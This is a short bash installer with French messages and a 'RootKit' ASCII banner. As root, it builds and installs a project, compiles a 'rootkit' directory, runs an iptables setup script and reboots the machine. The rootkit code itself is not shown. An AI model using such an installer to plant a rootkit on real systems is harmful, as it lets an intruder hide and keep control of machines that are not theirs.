#!/bin/bash

set -e

if [[ $EUID -ne 0 ]]; then
  echo "Ce script doit être exécuté en tant que root. Utilisez sudo."
  exit 1
fi

echo "
______            _   _    _ _     _____   ____ _____  _____ 
| ___ \          | | | |  (_) |   / __  \ / ___|  _  ||  _  |
| |_/ /___   ___ | |_| | ___| |_  \- / /'/ /___| |/' || |/' |
|    // _ \ / _ \| __| |/ / | __|   / /  | ___ \  /| ||  /| |
| |\ \ (_) | (_) | |_|   <| | |_  ./ /___| \_/ \ |_/ /\ |_/ /
\_| \_\___/ \___/ \__|_|\_\_|\__| \_____/\_____/\___/  \___/ 
"

autoreconf -fi
./configure --prefix=/usr/local
make
sudo make install
cd rootkit
make
cd ..
./setup-iptables.sh

echo -e "\nInstallation terminée."
echo "Appuyez sur Entrée pour redémarrer le système..."
read -r

sudo reboot